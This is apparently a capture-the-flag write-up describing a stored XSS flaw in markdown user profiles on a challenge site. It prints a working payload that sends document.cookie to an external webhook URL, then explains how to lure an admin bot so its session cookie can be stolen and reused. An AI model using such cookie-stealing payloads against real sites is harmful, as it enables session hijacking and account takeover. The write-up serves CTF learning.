### Author: Tinius

## Description

When you visit the website you are asked to create a user and a profile with markdown.

THe markdown is vulnerable to XSS and the cookie is not HTTP only so it can be extracted using js.

### Example Payload:
```markdown
<img src="https://buddy.no/app/uploads/2019/06/kattunge-i-menneskehand.jpg" onload="this.src='https://webhook.site/f2975371-81e1-4dea-af66-ba99314ea378?cookie='+document.cookie;">
```

After uploading the payload you need to ask the bot to "rate my profile" or "check out my profile".

The "admin" will then visit your profile and the payload will be executed.
You can then steal the cookie and login as the admin that has the flag on his profile.
